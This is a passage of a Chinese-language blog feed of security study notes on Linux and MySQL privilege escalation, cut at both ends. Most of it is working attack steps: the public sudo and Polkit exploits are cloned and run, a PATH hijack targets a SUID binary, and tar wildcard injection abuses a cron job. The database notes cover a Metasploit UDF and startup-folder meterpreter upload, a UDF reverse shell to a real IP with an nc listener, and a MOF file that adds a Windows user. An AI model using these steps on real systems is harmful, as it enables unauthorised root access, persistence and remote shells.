class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> -V<br><span class="hljs-built_in">sudo</span>: 1.8.2 - 1.8.31p2<br><span class="hljs-built_in">sudo</span>: 1.9.0 - 1.9.5p1<br>-判断：sudoedit -s / 报错存在。则漏洞存在<br>-利用：<br>git <span class="hljs-built_in">clone</span> https://github.com/blasty/CVE-2021-3156.git<br><span class="hljs-built_in">cd</span> CVE-2021-3156<br>make<br><span class="hljs-built_in">chmod</span> a+x sudo-hax-me-a-sandwich<br>./sudo-hax-me-a-sandwich 1<br></code></pre></td></tr></table></figure><p>有如下报错。即存在漏洞</p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230506145305048.png" alt="image-20230506145305048"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230515141832770.png" alt="image-20230515141832770"></p><h3 id="5、Polkit-CVE-2021-4034"><a href="#5、Polkit-CVE-2021-4034" class="headerlink" title="5、Polkit(CVE-2021-4034)"></a>5、Polkit(CVE-2021-4034)</h3><p>[]: 工具\1\演示EXP\CVE-2021-4034</p><p>Lampiao靶场复现</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs subunit">漏洞影响2009年5月至今的所有polkit版本<br><br>由于polkit是系统预装工具，所有存在polkit的linux系统均受影响<br>如：CentOS、Ubuntu、Debian、Redhat、Fedora、Gentoo、Mageia等<br>-判断：dpkg -l policykit<span class="hljs-string">-1</span><br>-利用：<br>git clone https://github.com/berdav/CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>.git<br>cd CVE<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span>/<br>make<br>./cve<span class="hljs-string">-2021</span><span class="hljs-string">-4034</span><br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230506163241818.png" alt="image-20230506163241818"></p><h2 id="四、环境变量文件配合SUID"><a href="#四、环境变量文件配合SUID" class="headerlink" title="四、环境变量文件配合SUID"></a>四、环境变量文件配合SUID</h2><h4 id="1、条件"><a href="#1、条件" class="headerlink" title="1、条件"></a>1、条件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">ROOT用户对某个第三方程序给予了SUID权限<br></code></pre></td></tr></table></figure><h4 id="2、探测-1"><a href="#2、探测-1" class="headerlink" title="2、探测"></a>2、探测</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">探针：<span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><h4 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用"></a>3、利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">首先root用户操作：<br>root用户讲可执行文件进行编译，<br>保证文件的正常授权运行，给予ROOT权限执行<br>gcc demo.c -o yunwei<span class="hljs-comment">#编译带有安全风险的C程序</span><br><span class="hljs-built_in">chmod</span> u+s yunwei<span class="hljs-comment">#给编译出来带有安全风险的程序赋予SUID权限</span><br><br>其次普通用户操作：<br>普通用户通过对文件反编译或源代码查看，覆盖其执行环境变量，直接让其执行指定程序获取权限<br><span class="hljs-built_in">cp</span> /bin/bash /tmp/ifconfig<span class="hljs-comment">#将/bin/bash程序 复制到 /tmp/ps程序</span><br><span class="hljs-built_in">export</span> PATH=/tmp:<span class="hljs-variable">$PATH</span><span class="hljs-comment">#更改环境变量。实现ps命令运行指向 /tmp/ps</span><br>./yunwei  <span class="hljs-comment">#运行</span><br><span class="hljs-built_in">id</span><br><br><br>过程分析：<br>1.先获取suid程序<br>2.去除系统自带的<br>3.下载这个程序进行反编译<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230505114521198.png" alt="image-20230505114521198"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="五、定时任务提权"><a href="#五、定时任务提权" class="headerlink" title="五、定时任务提权"></a>五、定时任务提权</h2><h3 id="定时任务-tar-suid"><a href="#定时任务-tar-suid" class="headerlink" title="定时任务&amp;tar&amp;suid"></a>定时任务&amp;tar&amp;suid</h3><h4 id="1、原理"><a href="#1、原理" class="headerlink" title="1、原理"></a>1、原理</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">利用定时任务配置不规范导致的安全风险<br><br>例如 执行的脚本（XX.sh）如下<br>cd /tmp;tar zxf bckup.tar.gz <br><br>在文件名 <span class="hljs-string">&quot;bckup.tar.gz*&quot;</span> 的末尾的星号 (*) 是一个通配符，匹配当前目录中以 <span class="hljs-string">&quot;bckup.tar.gz&quot;</span> 开头并在其后有其他字符的任何文件。当一个归档文件被分成多个文件以便于传输或存储时，这非常有用。<br>这样当文件夹下面有列入 “--checkpoint-action=exec=sh test.sh”的文件时。就会有如下效果<br>--&gt;tar cxf bckup.tar.gz --checkpoint-action=exec=sh test.sh<br>--&gt;tar cxf bckup.tar.gz --checkpoint=<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h4 id="2、条件"><a href="#2、条件" class="headerlink" title="2、条件"></a>2、条件</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">提权通过获取计划任务执行文件信息进行提权<br>1、相对路径和绝对路径执行<br>2、计划任务命令存在参数调用<br></code></pre></td></tr></table></figure><p><strong>复现环境</strong></p><p>定时任务  运用到了 tar  czf  &#x2F;tmp&#x2F;backup.tar.gz *</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-number">1</span>.上传环境复现定时脚本:bak.sh<br>压缩：cd /tmp;tar czf /tmp/backup.tar.gz *<br><br>(注意上传后要赋权 chmod +x bak.sh)<br><span class="hljs-number">2</span>.配置定时任务：<br>*/<span class="hljs-number">1</span> * * * * root /tmp/bak.sh<br><span class="hljs-number">3</span>.开启定时任务：<br>/sbin/service crond start <br><br>crontab -u root -l<br>---定时相关其他命令---<br>/sbin/service crond stop <span class="hljs-comment">//关闭服务</span><br>/sbin/service crond restart <span class="hljs-comment">//重启服务</span><br>/sbin/service crond reload <span class="hljs-comment">//重新载入配置</span><br>/sbin/service crond status <span class="hljs-comment">//启动服务</span><br></code></pre></td></tr></table></figure><h4 id="3、利用-1"><a href="#3、利用-1" class="headerlink" title="3、利用"></a>3、利用</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">在相关命令下执行目录。利用计划任务的备份功能tar命令的参数利用<br><br>tar  czf  /tmp/backup.tar.gz *<br><br>tar  czf /tmp/backup.tar.gz *<br>tar  czf /tmp/backup.tar.gz aaa.sh<br>tar  czf /tmp/backup.tar.gz abc.txt<br>.......<br>tar  czf /tmp/backup.tar.gz --checkpoint=<span class="hljs-number">1</span><br>tar  czf /tmp/backup.tar.gz -checkpoint-action=exec=sh test.sh<br><br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=sh test.sh&quot;</span><span class="hljs-comment">#以命令参数命名的文件  </span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; --checkpoint=<span class="hljs-number">1</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; test.sh<br><br><br>chmod +x test.sh<br><br>==》等待定时任务被执行<br>运行 ./bash -<span class="hljs-title function_ invoke__">p</span>   (到这相当于用SUID提权)<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230505164706431.png" alt="image-20230505164706431"></p><h3 id="定时任务-文件权限"><a href="#定时任务-文件权限" class="headerlink" title="定时任务&amp;文件权限"></a>定时任务&amp;文件权限</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">同样以上面这个定时任务为例子<br>假如，root用户给这个脚本赋权的时候 用的<span class="hljs-number">777</span> 或者 <span class="hljs-number">775</span> 赋权<br>那么我们低配用户。就有修改这个脚本的权限<br><br>可修改为反弹命令<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_linux.assets/image-20230505170751181.png" alt="image-20230505170751181"></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>我的第一篇网络安全文章</title>
    <link href="/2021/10/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0/"/>
    <url>/2021/10/14/%E6%88%91%E7%9A%84%E7%AC%AC%E4%B8%80%E7%AF%87%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%96%87%E7%AB%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="文章标题"><a href="#文章标题" class="headerlink" title="文章标题"></a>文章标题</h1><p>这是我的第一篇博客内容，介绍网络安全的基础知识…</p><h2 id="子标题"><a href="#子标题" class="headerlink" title="子标题"></a>子标题</h2><p>详细内容…</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全技术</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限提升_数据库（总）</title>
    <link href="/2021/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E6%80%BB%EF%BC%89/"/>
    <url>/2021/03/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%88%E6%80%BB%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="权限提升-数据库"><a href="#权限提升-数据库" class="headerlink" title="权限提升_数据库"></a>权限提升_数据库</h1><h2 id="一、MYSQL"><a href="#一、MYSQL" class="headerlink" title="一、MYSQL"></a>一、MYSQL</h2><h3 id="1、提权条件"><a href="#1、提权条件" class="headerlink" title="1、提权条件"></a>1、提权条件</h3><p>-数据库的最高权限用户的密码<br>-secure-file-priv没进行目录限制</p><p>SHOW VARIABLES LIKE “secure_file_priv”;</p><p>0、网站存在高权限SQL注入点<br>1、数据库的存储文件或备份文件<br>2、网站应用源码中的数据库配置文件<br>3、采用工具或脚本爆破(需解决外联问题)</p><p>进到root数据库–》admin权限</p><h3 id="2、账号密码获取"><a href="#2、账号密码获取" class="headerlink" title="2、账号密码获取"></a>2、账号密码获取</h3><h4 id="2-1、通过注入点"><a href="#2-1、通过注入点" class="headerlink" title="2.1、通过注入点"></a>2.1、通过注入点</h4><p>sqlmap.py      -D mysql -T user -C “password”</p><h4 id="2-2、通过文件"><a href="#2-2、通过文件" class="headerlink" title="2.2、通过文件"></a>2.2、通过文件</h4><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426102424394.png" alt="image-20230426102424394"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426102506705.png" alt="image-20230426102506705"></p><p><a href="https://www.cmd5.com/">https://www.cmd5.com/</a></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426104638481.png" alt="image-20230426104638481"></p><h4 id="2-3、网站配置文件"><a href="#2-3、网站配置文件" class="headerlink" title="2.3、网站配置文件"></a>2.3、网站配置文件</h4><h3 id="3、mysql–-UDF提权"><a href="#3、mysql–-UDF提权" class="headerlink" title="3、mysql–&gt;UDF提权"></a>3、mysql–&gt;UDF提权</h3><p>原理</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ada">UDF（Userdefined <span class="hljs-keyword">function</span>）可翻译为用户自定义函数,dll文件<br><span class="hljs-comment">---》数据库指定插件目录</span><br><br>其为mysql的一个拓展接口，<br>可以为mysql增添一些函数。<br><br>比如mysql一些函数没有，我就使用UDF加入一些函数进去，那么我就可以在mysql中使用这个函数了。<br></code></pre></td></tr></table></figure><p>利用条件</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-数据库的最高权限用户的密码</span><br><span class="hljs-deletion">-secure-file-priv没进行目录限制</span><br></code></pre></td></tr></table></figure><h4 id="3-1、开启外连"><a href="#3-1、开启外连" class="headerlink" title="3.1、开启外连"></a>3.1、开启外连</h4><p>方法一：</p><p>修改mysql中user表数据</p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230514164652266.png" alt="image-20230514164652266"></p><p>方法二：</p><p>执行语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs （）">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;root&#x27; WITH GRANT OPTION;<br>GRANT ALL PRIVILEGES ON *.* TO &#x27;帐号&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;密码&#x27; WITH GRANT OPTION;<br>---这是一条MySQL授权语句，<br>用于授予指定用户在所有数据库和表上拥有所有权限，并且可以在任何主机上连接到MySQL服务器。<br></code></pre></td></tr></table></figure><p>思考1：未打开外连的时候，为什么webshell可以连接mysql</p><p>思考2：localhost<code>和</code>::1、127.0.0.1、‘%’区别是什么</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">localhost需要被解析<br><span class="hljs-number">127.0.0.1</span> 指代本地ipv4<br>::<span class="hljs-number">1</span>指代本地ipv6<br>&#x27;%&#x27;是通配符，代表可以从任何主机连接到MySQL服务器<br></code></pre></td></tr></table></figure><h4 id="3-2、查版本"><a href="#3-2、查版本" class="headerlink" title="3.2、查版本"></a>3.2、查版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> version() <span class="hljs-comment">#查版本</span><br><span class="hljs-keyword">select</span> @@basedir <span class="hljs-comment">#查安装路径</span><br><br>用户自定义函数，dll类型<br>UDF导入函数的文件为,dll类型，其存放的目录受版本影响如下：<br><br>1.mysql&lt;5.2 dll导出目录c:/windows或system32<br>2.mysql&gt;=5.2 dll导出  %安装目录%/lib/plugin/XXXX.DLL<br><br><br>没有目录采用手工创建plugin目录<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426110755030.png" alt="image-20230426110755030"></p><h4 id="3-3-1、调用MSF"><a href="#3-3-1、调用MSF" class="headerlink" title="3.3.1、调用MSF"></a>3.3.1、调用MSF</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs routeros">使用MSF中的exploit/multi/mysql/mysql_udf_payload 模块可以进行UDF提权,<br><br>MSF会将dll文件写入lib\plugin\目录下(前提是该目录存在，需手工创建),<br>该dll文件中包含sys_exec()和sys_eval()两个函数，<br><br><br>use exploit/multi/mysql/mysql_udf_payload<br><span class="hljs-built_in">set</span> password root<br><span class="hljs-built_in">set</span> rhosts 192.168.1.15<br><span class="hljs-built_in">run</span><br><br>成功生成DLL后，可在fuc表下查询到↓↓↓↓↓↓↓<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426112014088.png" alt="image-20230426112014088"></p><h4 id="3-3-2、命令执行"><a href="#3-3-2、命令执行" class="headerlink" title="3.3.2、命令执行"></a>3.3.2、命令执行</h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs csharp">上面默认只创建sys_exec()函数，该函数执行并不会有回显。<br>我们可以手动创建 sys_eval() 函数，来执行有回显的命令<br><br><span class="hljs-comment">//1.查看 是否有‘sys_exec’</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> mysql.func; <span class="hljs-meta">#查mysql扩展函数</span><br><br><span class="hljs-comment">//2.创建函数绑定dll</span><br>create function &lt;函数名&gt; returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&quot;&lt;dll文件名&gt;&quot;</span>;<br>create function sys_eval returns <span class="hljs-built_in">string</span> soname <span class="hljs-string">&quot;KaMeVAyW.dll&quot;</span>;<br><br>DROP FUNCTION &lt;function_name&gt; <span class="hljs-meta">#删除自定义函数</span><br><br><br><span class="hljs-comment">//3.调用函数进行命令执行</span><br><span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">sys_eval</span>(<span class="hljs-params"><span class="hljs-string">&quot;whoami&quot;</span></span>)</span>;<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426112508030.png" alt="image-20230426112508030"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h3 id="4、mysql–-MSF启动项提权"><a href="#4、mysql–-MSF启动项提权" class="headerlink" title="4、mysql–&gt;MSF启动项提权"></a>4、mysql–&gt;MSF启动项提权</h3><p>原理：上传木马到启动项文件。当电脑重启的时候，启动项文件被触发。实现上线</p><p>4.1、利用条件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ka">外连<br>-数据库的最高权限用户的密码<br>-secure-file-priv没进行目录限制<br></code></pre></td></tr></table></figure><p>kali –》 win10 phpstudy</p><p>4.2、使用模块</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><br>MSF：（前提先开外链）<br>use exploit/windows/mysql/mysql_start_up<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> rhosts 192.168.88.131<br><span class="hljs-built_in">set</span> username root<br><span class="hljs-built_in">set</span> password root<br><span class="hljs-built_in">set</span> AllowNoCleanup  <span class="hljs-literal">true</span><br><span class="hljs-built_in">run</span><br><br>原理：上传木马到启动项，电脑重启后自动运行。下图上传成功，只需打开监听模块等待上线即可<br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426114415978.png" alt="image-20230426114415978"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230426114354456.png" alt="image-20230426114354456"></p><h3 id="5、mysql–-MSF反弹Shell（UDF）"><a href="#5、mysql–-MSF反弹Shell（UDF）" class="headerlink" title="5、mysql–&gt;MSF反弹Shell（UDF）"></a>5、mysql–&gt;MSF反弹Shell（UDF）</h3><p><a href="https://blog.csdn.net/weixin_43801718/article/details/105493042">https://blog.csdn.net/weixin_43801718/article/details/105493042</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">use mysql;<br><span class="hljs-keyword">set</span> @a=concat(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-comment">----这里shell太长了。详见笔记shell.txt---</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> Ghost(data LONGBLOB);<br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> Ghost <span class="hljs-keyword">values</span>(&quot;&quot;);<span class="hljs-keyword">update</span> Ghost <span class="hljs-keyword">set data</span> = @a;<br><br><span class="hljs-keyword">select</span> data <span class="hljs-keyword">from</span> Ghost <span class="hljs-keyword">into</span> DUMPFILE <span class="hljs-string">&#x27;C:\\phpstudy\\PHPTutorial\\MySQL\\lib\\plugin\\udf.dll&#x27;</span>;#创建文件（数据从上面创建的表获取）<br><br><span class="hljs-comment">--------------</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">function</span> backshell <span class="hljs-keyword">returns</span> string soname <span class="hljs-string">&#x27;udf.dll&#x27;</span>;  #创建函数<br><br>攻击机：开启监听 nc  -lvp <span class="hljs-number">3333</span><br><span class="hljs-keyword">select</span> backshell(<span class="hljs-string">&#x27;43.138.215.2&#x27;</span>,<span class="hljs-number">3333</span>)   连接<br><br><br></code></pre></td></tr></table></figure><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230514175207468.png" alt="image-20230514175207468"></p><p><img src="/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87_%E6%95%B0%E6%8D%AE%E5%BA%93.assets/image-20230514175145476.png" alt="image-20230514175145476"></p><h3 id="6、mysql–-MOF提权"><a href="#6、mysql–-MOF提权" class="headerlink" title="6、mysql–&gt;MOF提权"></a>6、mysql–&gt;MOF提权</h3><h4 id="6-1、原理-条件："><a href="#6-1、原理-条件：" class="headerlink" title="6.1、原理&amp;条件："></a>6.1、原理&amp;条件：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">利用了c:<span class="hljs-regexp">/windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of/目录下的 nullevt.mof 文件，<br>每分钟都会在一个特定的时间去执行一次的特性，写入我们的cmd命令使其被带入执行，从而添加新用户提权。<br><br>测试的主机上该目录下并没有该mof文件，<br>因此我们直接导入一个文件。<br>当然这里需要权限，一般来说MOF普通用户是无法执行操作的，即使是拿到了一个shell，<br>也只是普通权限用户，利用条件有些苛刻。<br><br>MOF提权的条件要求十分严苛：<br><span class="hljs-number">1</span>.windows <span class="hljs-number">03</span>及以下版本<br><span class="hljs-number">2</span>.mysql有读写 C:<span class="hljs-regexp">/Windows/</span>system32<span class="hljs-regexp">/wbem/m</span>of 的权限<br><span class="hljs-number">3</span>.secure_file_priv没进行目录限制<br></code></pre></td></tr></table></figure><h4 id="6-2、上传准备好的mof文件"><a href="#6-2、上传准备好的mof文件" class="headerlink" title="6.2、上传准备好的mof文件"></a>6.2、上传准备好的mof文件</h4><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __EventFilter as $EventFilter<br>&#123;<br>EventNamespace = <span class="hljs-string">&quot;Root\\Cimv2&quot;</span>;<br>Name = <span class="hljs-string">&quot;filtP2&quot;</span>;<br>Query = <span class="hljs-string">&quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="hljs-string">&quot;Where TargetInstance Isa \&quot;</span>Win32_LocalTime\<span class="hljs-string">&quot; &quot;</span><br><span class="hljs-string">&quot;And TargetInstance.Second = 5&quot;</span>;<br>Query<span class="hljs-class">Language = &quot;WQL&quot;;</span><br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of ActiveScriptEventConsumer as $Consumer<br>&#123;<br>Name = <span class="hljs-string">&quot;consPCSV2&quot;</span>;<br>ScriptingEngine = <span class="hljs-string">&quot;JScript&quot;</span>;<br>ScriptText =<br><span class="hljs-string">&quot;var WSH = new ActiveXObject(\&quot;</span>WScript.Shell\<span class="hljs-string">&quot;)\nWSH.run(\&quot;</span>net.exe user mofmof mofmof /add\<span class="hljs-string">&quot;)&quot;</span>;<br>&#125;;<span class="hljs-built_in"></span><br><span class="hljs-built_in">instance </span>of __FilterToConsumerBinding<br>&#123;<br>Consumer = $Consumer;<br>Filter = $EventFilter;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h4 id="6-3、执行语句导入mof文件"><a href="#6-3、执行语句导入mof文件" class="headerlink" title="6.3、执行语句导入mof文件"></a>6.3、执行语句导入mof文件</h4><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs 